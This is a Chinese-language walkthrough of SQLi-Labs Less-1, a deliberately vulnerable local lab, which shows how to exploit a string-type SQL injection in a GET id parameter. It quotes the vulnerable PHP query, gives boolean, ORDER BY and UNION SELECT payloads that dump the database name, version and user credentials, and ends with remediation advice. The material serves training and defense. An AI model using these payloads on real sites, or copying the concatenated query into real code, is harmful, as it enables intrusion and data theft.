SQLi-Labs Less-1：GET 字符型报错与联合查询注入

# SQLi-Labs # Web # SQL注入 # GET # 字符型 # UNION

一、题目信息

  • 题目：SQLi-Labs Less-1 - Error Based - String
  • 方向：Web / SQL Injection
  • 环境：本地授权 SQLi-Labs 靶场
  • 目标：确认 GET 参数存在字符型 SQL 注入，并读取数据库信息。
  • Flag：该靶场没有 flag，以成功读取数据库信息作为验证结果。

二、观察入口与源码

第 1 关通过 URL 参数 id 查询用户。正常访问时页面返回用户 Dumb：

http://127.0.0.1:18080/Less-1/?id=1

查看本地源码后，可以看到参数没有经过类型转换或参数绑定，直接拼接进了单引号包围的 SQL 字符串：

$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";

由于输入位置位于单引号内部，攻击者可以先用单引号闭合字符串，再追加 SQL 条件或查询语句。

三、确认字符型注入

分别提交永真和永假条件，观察页面返回的用户信息是否变化：

输入页面的 SQL 条件预期
1' and '1'='1真条件返回 Dumb / Dumb
1' and '1'='2假条件不返回用户信息

实际验证结果如下：

id=1' and '1'='1 → Welcome Dhakkan
Your Login name:Dumb
Your Password:Dumb
id=1' and '1'='2 → Welcome Dhakkan
（没有用户信息）

真假条件产生了不同的页面结果，说明单引号成功改变了原有 SQL 条件，注入点成立。

四、判断查询列数

使用 ORDER BY 逐列测试。第 3 列仍然正常，第 4 列出现错误：

id=1' order by 3#
id=1' order by 4#
Unknown column '4' in 'order clause'

因此当前查询共有 3 列，后续可以使用三列 UNION SELECT。

五、联合查询读取数据库信息

将原查询结果置空，再让查询返回数据库名和版本号。页面第二列显示数据库名，第三列显示版本号：

id=-1' union select 1,database(),version()#
Your Login name:security
Your Password:5.5.44-0ubuntu0.14.04.1

继续把 users 表中的用户名和密码合并到结果中，验证可以通过 UNION 读取业务表数据：

id=-1' union select 1,group_concat(username),group_concat(password) from users#
Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4

用户名和对应的密码都被成功读出，说明注入不仅能改变条件，还能跨表读取数据。

URL 编码说明： # 在 URL 中表示片段标识符，直接放进地址栏时可能不会发送给服务器。复现时应编码为 %23。例如： ?id=-1%27%20union%20select%201%2Cdatabase()%2Cversion()%23

六、完整请求示例

GET /Less-1/?id=-1%27%20union%20select%201%2Cdatabase()%2Cversion()%23 HTTP/1.1
Host: 127.0.0.1:18080

解码后的 payload 为：

-1' union select 1,database(),version()#

七、漏洞原因与影响

根因是把用户输入直接拼接进 SQL，导致输入被数据库解释为 SQL 语法，而不是普通数据。攻击者可以改变查询条件、读取其他表的数据，甚至进一步利用数据库权限访问敏感信息。

八、修复建议

  • 使用 PDO 或 mysqli 预处理语句，将 id 作为参数绑定，禁止直接拼接。
  • 对数字型参数执行严格的整数校验，并统一类型转换。
  • 关闭生产环境中的详细数据库错误回显，避免泄露 SQL 结构和数据库版本。
  • 数据库账号遵循最小权限原则，只授予业务所需的表和数据操作权限。

九、复盘

第 1 关的关键是按顺序完成四件事：用单引号确认字符型注入点，用真假条件确认页面差异，用 ORDER BY 判断列数，再用 UNION SELECT 读取数据库信息。相比直接背 payload，更重要的是先看懂源码中的引号闭合方式。
